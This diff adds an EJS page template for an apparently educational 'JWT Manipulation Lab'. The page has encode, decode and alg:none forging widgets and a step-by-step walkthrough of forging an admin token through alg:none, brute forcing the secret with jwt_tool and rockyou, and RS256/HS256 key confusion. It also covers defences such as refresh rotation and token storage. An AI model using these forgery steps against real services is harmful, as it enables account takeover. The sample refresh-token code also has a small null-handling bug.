@@ -1,0 +1,321 @@
+<%- include('partials/header') %>
+
+<section class="hero fade-in">
+  <span class="hero__badge">Module 05 — Interactive</span>
+  <h1 class="hero__title">JWT Manipulation Lab</h1>
+  <p class="hero__subtitle">Encode, decode, and tamper with JWTs live. Perform alg:none attacks, modify payloads, and understand JWT forgery.</p>
+</section>
+
+<div class="container fade-in">
+
+  <!-- JWT Encoder -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Lab 5.1</div>
+      <h2 class="section__title">🔒 JWT Encoder</h2>
+    </div>
+
+    <div class="lab">
+      <div class="lab__title">⚙️ Create a JWT Token</div>
+
+      <div class="lab__group">
+        <label class="lab__label" for="jwt-payload">Payload (JSON)</label>
+        <textarea class="lab__textarea" id="jwt-payload" rows="5">{
+  "sub": "1234567890",
+  "name": "John Doe",
+  "role": "admin",
+  "iat": 1516239022
+}</textarea>
+      </div>
+
+      <div class="lab__row">
+        <div class="lab__group">
+          <label class="lab__label" for="jwt-secret">Secret Key</label>
+          <input class="lab__input" id="jwt-secret" type="text" value="my-super-secret-key" placeholder="Enter secret key...">
+        </div>
+        <div class="lab__group">
+          <label class="lab__label" for="jwt-algorithm">Algorithm</label>
+          <select class="lab__select" id="jwt-algorithm">
+            <option value="HS256" selected>HS256 (HMAC-SHA256)</option>
+            <option value="HS384">HS384 (HMAC-SHA384)</option>
+            <option value="HS512">HS512 (HMAC-SHA512)</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="lab__btn-group">
+        <button class="lab__btn lab__btn--primary" onclick="encodeJWT()" id="btn-encode">🔐 Encode JWT</button>
+      </div>
+
+      <div class="lab__result" id="jwt-encode-result"></div>
+    </div>
+  </div>
+
+  <!-- JWT Decoder -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Lab 5.2</div>
+      <h2 class="section__title">🔓 JWT Decoder & Verifier</h2>
+    </div>
+
+    <div class="lab">
+      <div class="lab__title">🔍 Decode & Verify a JWT Token</div>
+
+      <div class="lab__group">
+        <label class="lab__label" for="jwt-decode-token">JWT Token</label>
+        <textarea class="lab__textarea" id="jwt-decode-token" rows="4" placeholder="Paste a JWT token here...">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.ePJrBMOBnFOkIFn5makILus6SBpkMU5fCsp2jEMDmKk</textarea>
+      </div>
+
+      <div class="lab__group">
+        <label class="lab__label" for="jwt-decode-secret">Secret Key (optional — for signature verification)</label>
+        <input class="lab__input" id="jwt-decode-secret" type="text" value="my-super-secret-key" placeholder="Enter secret to verify signature...">
+      </div>
+
+      <div class="lab__btn-group">
+        <button class="lab__btn lab__btn--blue" onclick="decodeJWT()" id="btn-decode">🔓 Decode & Verify</button>
+      </div>
+
+      <div class="lab__result" id="jwt-decode-result"></div>
+    </div>
+  </div>
+
+  <!-- JWT Tamper (alg:none) -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Lab 5.3</div>
+      <h2 class="section__title">⚠️ JWT Tamper — <code>alg:none</code> Attack</h2>
+    </div>
+
+    <div class="info-box info-box--warning">
+      <div class="info-box__title">⚠️ Security Warning</div>
+      <div class="info-box__content">
+        <p>The <code>alg:none</code> attack is one of the most critical JWT vulnerabilities. It allows an attacker to forge tokens <strong>without knowing the secret key</strong> by setting the algorithm to "none" and providing an empty signature. A properly secured server MUST reject such tokens.</p>
+      </div>
+    </div>
+
+    <div class="lab">
+      <div class="lab__title">🔴 Forge a Token with alg:none</div>
+
+      <div class="lab__group">
+        <label class="lab__label" for="jwt-tamper-payload">Tampered Payload (JSON) — Change the role!</label>
+        <textarea class="lab__textarea" id="jwt-tamper-payload" rows="5">{
+  "sub": "1234567890",
+  "name": "Attacker",
+  "role": "admin",
+  "iat": 1516239022
+}</textarea>
+      </div>
+
+      <div class="lab__btn-group">
+        <button class="lab__btn lab__btn--danger" onclick="tamperJWT()" id="btn-tamper">💀 Create alg:none Token</button>
+      </div>
+
+      <div class="lab__result" id="jwt-tamper-result"></div>
+    </div>
+  </div>
+
+  <!-- JWT Attack Explanation -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 5.4</div>
+      <h2 class="section__title">JWT Manipulation with Online Resources</h2>
+    </div>
+
+    <div class="section__content">
+      <p>Several online tools and command-line utilities allow you to inspect, decode, and manipulate JWT tokens. Here's how attackers use them:</p>
+    </div>
+
+    <div class="info-box info-box--explain">
+      <div class="info-box__title">ℹ️ Online JWT Tools</div>
+      <div class="info-box__content">
+        <ul>
+          <li><strong><a href="https://jwt.io" target="_blank" style="color:var(--accent);">jwt.io</a></strong> — Decode JWT tokens, inspect header/payload, verify signatures. The most popular JWT debugging tool.</li>
+          <li><strong><a href="https://token.dev" target="_blank" style="color:var(--accent);">token.dev</a></strong> — JWT debugger with advanced features for testing claims and algorithms.</li>
+          <li><strong><a href="https://gchq.github.io/CyberChef/" target="_blank" style="color:var(--accent);">CyberChef</a></strong> — General purpose encoding/decoding tool. Supports Base64URL decoding of JWT parts.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="info-box info-box--exploit">
+      <div class="info-box__title">🔴 Step-by-Step: Changing JWT Payload to Login as Admin</div>
+      <div class="info-box__content">
+        <div class="code-block">
+          <div class="code-block__header">
+            <span class="code-block__lang">Step-by-Step JWT Manipulation</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+          <pre><code># SCENARIO: You intercepted a JWT from a regular user
+
+# Step 1: Copy the JWT token from browser DevTools
+# Application → Cookies → or Authorization header
+Token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.xxx
+
+# Step 2: Go to jwt.io → Paste the token
+# It automatically decodes:
+# Header:  {"alg":"HS256"}
+# Payload: {"sub":"user123","role":"user"}
+
+# Step 3: ATTACK 1 — alg:none (if server is vulnerable)
+# Change header to: {"alg":"none","typ":"JWT"}
+# Change payload to: {"sub":"user123","role":"admin"}
+# Remove signature (leave empty after the last dot)
+# New token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIn0.
+
+# Step 4: ATTACK 2 — Brute force weak secret
+# Use jwt_tool:
+python3 jwt_tool.py &lt;token&gt; -C -d rockyou.txt
+# If secret is weak (e.g., "secret123"), it will be cracked!
+# → Now you know the secret and can sign any payload
+
+# Step 5: ATTACK 3 — Algorithm confusion (RS256 → HS256)
+# If server uses RS256, try using the PUBLIC KEY as HMAC secret
+# Download public key from /well-known/jwks.json
+# Sign with HS256 using public key as secret
+python3 jwt_tool.py &lt;token&gt; -X k -pk public_key.pem
+
+# Step 6: Use the forged token
+# Set in browser: localStorage.setItem('token', forgedToken)
+# Or modify the Authorization header in Burp Suite
+# → Login as admin! 💀</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box info-box--explain">
+      <div class="info-box__title">ℹ️ jwt_tool — Command Line JWT Toolkit</div>
+      <div class="info-box__content">
+        <div class="code-block">
+          <div class="code-block__header">
+            <span class="code-block__lang">Bash — jwt_tool Commands</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+          <pre><code># Install jwt_tool
+git clone https://github.com/ticarpi/jwt_tool
+cd jwt_tool && pip3 install -r requirements.txt
+
+# Decode a token
+python3 jwt_tool.py eyJhbGci...
+
+# Test all known JWT attacks
+python3 jwt_tool.py eyJhbGci... -M at
+
+# Brute force the secret
+python3 jwt_tool.py eyJhbGci... -C -d /usr/share/wordlists/rockyou.txt
+
+# Tamper claims
+python3 jwt_tool.py eyJhbGci... -T    # Interactive tampering
+
+# Test alg:none
+python3 jwt_tool.py eyJhbGci... -X a   # alg:none attack
+
+# Key confusion attack
+python3 jwt_tool.py eyJhbGci... -X k -pk public.pem</code></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Other JWT Concepts -->
+  <div class="section">
+    <div class="section__header">
+      <div class="section__number">Section 5.5</div>
+      <h2 class="section__title">Other Essential JWT Concepts</h2>
+    </div>
+
+    <div class="info-box info-box--explain">
+      <div class="info-box__title">ℹ️ Refresh Token Rotation</div>
+      <div class="info-box__content">
+        <p>Access tokens should be short-lived (15 min). Refresh tokens are used to get new access tokens without re-login. <strong>Refresh token rotation</strong> means each refresh token can only be used once — after use, a new refresh token is issued. If a stolen refresh token is used, the rotation chain is broken and all tokens are invalidated.</p>
+        <div class="code-block">
+          <div class="code-block__header">
+            <span class="code-block__lang">JavaScript — Refresh Token Flow</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+          <pre><code>// Access token: 15 min, stored in memory
+// Refresh token: 7 days, stored in HttpOnly cookie
+
+app.post('/api/refresh', (req, res) => {
+  const refreshToken = req.cookies.refresh_token;
+  const stored = await db.findRefreshToken(refreshToken);
+
+  if (!stored || stored.used) {
+    // Token reuse detected! Possible theft!
+    await db.invalidateAllTokensForUser(stored.userId);
+    return res.status(401).json({ error: 'Suspicious activity' });
+  }
+
+  // Mark current refresh token as used
+  await db.markAsUsed(refreshToken);
+
+  // Issue new tokens
+  const newAccess = jwt.sign({ sub: stored.userId }, SECRET, { expiresIn: '15m' });
+  const newRefresh = crypto.randomBytes(32).toString('hex');
+  await db.storeRefreshToken(newRefresh, stored.userId);
+
+  res.cookie('refresh_token', newRefresh, { httpOnly: true, secure: true, sameSite: 'strict' });
+  res.json({ accessToken: newAccess });
+});</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box info-box--explain">
+      <div class="info-box__title">ℹ️ JWT vs Session Tokens</div>
+      <div class="info-box__content">
+        <div class="table-wrap" style="margin:12px 0;">
+          <table>
+            <thead>
+              <tr><th>Aspect</th><th>JWT (Stateless)</th><th>Session Token (Stateful)</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>Storage</td><td>Token contains all data (self-contained)</td><td>Only ID stored; data on server</td></tr>
+              <tr><td>Server load</td><td>No database lookup needed</td><td>DB/Redis lookup every request</td></tr>
+              <tr><td>Revocation</td><td>Hard — need blacklist or versioning</td><td>Easy — delete from server store</td></tr>
+              <tr><td>Scalability</td><td>Excellent — no shared state</td><td>Requires shared session store</td></tr>
+              <tr><td>Size</td><td>Larger (payload data + signature)</td><td>Small (just session ID)</td></tr>
+              <tr><td>Security</td><td>Payload visible (Base64); signature protects integrity</td><td>Data hidden on server</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box info-box--explain">
+      <div class="info-box__title">ℹ️ JWE (JSON Web Encryption)</div>
+      <div class="info-box__content">
+        <p>While JWS (JSON Web Signature) only ensures integrity (anyone can read the payload), <strong>JWE</strong> encrypts the payload so it cannot be read without the encryption key. Use JWE when the token payload contains sensitive data like PII, medical records, or financial information.</p>
+        <p>JWE structure: <code>Header.EncryptedKey.IV.Ciphertext.AuthTag</code> (5 parts vs JWT's 3)</p>
+      </div>
+    </div>
+
+    <div class="info-box info-box--explain">
+      <div class="info-box__title">ℹ️ JWKS (JSON Web Key Set)</div>
+      <div class="info-box__content">
+        <p><strong>JWKS</strong> is a standard way to publish public keys used to verify JWTs. Servers expose a <code>/.well-known/jwks.json</code> endpoint containing their public keys. This allows clients and other services to verify tokens without sharing private keys.</p>
+        <p><strong>Security concern:</strong> If the <code>jku</code> (JWK Set URL) header is not validated, an attacker can point it to their own server with forged keys (JKU spoofing attack).</p>
+      </div>
+    </div>
+
+    <div class="info-box info-box--explain">
+      <div class="info-box__title">ℹ️ Token Storage Best Practices</div>
+      <div class="info-box__content">
+        <div class="table-wrap" style="margin:12px 0;">
+          <table>
+            <thead>
+              <tr><th>Storage Location</th><th>XSS Risk</th><th>CSRF Risk</th><th>Recommendation</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><code>localStorage</code></td><td>❌ Vulnerable</td><td>✅ Safe</td><td>⚠️ Avoid for auth tokens</td></tr>
+              <tr><td><code>sessionStorage</code></td><td>❌ Vulnerable</td><td>✅ Safe</td><td>⚠️ Better, but still XSS risk</td></tr>
+              <tr><td>HttpOnly Cookie</td><td>✅ Safe</td><td>❌ Needs SameSite</td><td>✅ Best with SameSite=Strict</td></tr>
+              <tr><td>Memory (JS variable)</td><td>✅ Safe</td><td>✅ Safe</td><td>✅ Best for access tokens (lost on refresh)</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<%- include('partials/footer') %>
